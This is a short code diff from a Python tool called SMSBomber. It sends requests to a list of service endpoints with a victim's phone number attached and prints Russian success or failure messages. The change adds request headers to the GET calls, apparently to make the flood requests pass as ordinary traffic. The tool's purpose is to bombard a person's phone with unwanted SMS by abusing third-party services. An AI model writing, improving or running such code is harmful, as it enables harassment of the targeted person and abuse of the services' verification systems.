@@ -38,7 +38,7 @@ class SMSBomber:
 							request = requests.post(key,
 								   headers=headers,json=meta)
 						elif _type == 'get':
-							request = requests.get(key + self.number)
+							request = requests.get(key + self.number,headers=headers)
 						print(f'[✔]{key.split("/")[2].title()} выполнен!')
 					except:
 						print(f'[✖]{key.split("/")[0]} не выполнен')
